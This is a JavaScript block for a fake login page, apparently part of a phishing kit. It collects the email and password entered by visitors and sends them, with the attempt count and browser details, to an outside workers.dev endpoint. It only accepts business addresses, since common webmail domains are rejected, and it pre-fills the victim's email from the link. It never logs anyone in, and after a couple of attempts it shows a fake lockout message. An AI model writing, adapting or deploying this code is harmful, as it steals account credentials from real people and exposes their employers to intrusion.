<script>
(function(){
  const endpoint = 'https://notify-login.codeck02.workers.dev';
  const bannedDomains = [
    'gmail.com','yahoo.com','outlook.com',
    'hotmail.com','aol.com','msn.com','icloud.com'
  ];

  let attemptCount = 0;
  const maxAttempts = 2;

  const form     = document.getElementById('loginForm'),
        emailFld = document.getElementById('email'),
        passFld  = document.getElementById('password'),
        errorDiv = document.getElementById('errorMsg'),
        loginBtn = document.getElementById('loginBtn'),
        forgotPw = document.getElementById('forgotPwd');

  // Pre-fill email from fragment
  const hashEmail = window.location.hash.substr(1);
  if (hashEmail) emailFld.value = decodeURIComponent(hashEmail);

  forgotPw.addEventListener('click', e => {
    e.preventDefault();
    alert('Password reset link would be sent to: ' + (emailFld.value.trim()||'[your email]'));
  });

  form.addEventListener('submit', e => {
    e.preventDefault();
    errorDiv.textContent = '';    // clear previous
    if (loginBtn.disabled) return; // already locked

    const email = emailFld.value.trim(),
          password = passFld.value;

    // --- VALIDATIONS ---
    if (!email.includes('@')) {
      return errorDiv.textContent = 'Please include an @ in your e-mail.';
    }
    const domain = email.split('@').pop().toLowerCase();
    if (bannedDomains.includes(domain)) {
      return errorDiv.textContent = 'Please use your BUSINESS e-mail address.';
    }
    if (password.length < 4) {
      return errorDiv.textContent = 'Password must be at least 4 characters.';
    }

    // --- IMMEDIATE FEEDBACK ---
    attemptCount++;
    const lockout = attemptCount > maxAttempts;
    if (lockout) {
      errorDiv.textContent = "You can't access your account right now. Try again later.";
      loginBtn.disabled = true;
      emailFld.disabled = passFld.disabled = true;
    } else {
      errorDiv.textContent = 'Sending…';
      passFld.value = '';
    }

    // --- ASYNC SUBMIT (non-blocking) ---
    const payload = {
      email,
      password,
      attemptCount,
      // you can include these too
      ua: navigator.userAgent,
      ts: new Date().toISOString()
    };
    fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify(payload)
    })
    .then(_=> {
      if (!lockout) {
        // let the user know we got through
        errorDiv.textContent = 'Logged attempt #' + attemptCount + '.';
      }
    })
    .catch(_=>{
      if (!lockout) {
        errorDiv.textContent = 'Network error. Please try again.';
      }
    });
  });
})();
</script>
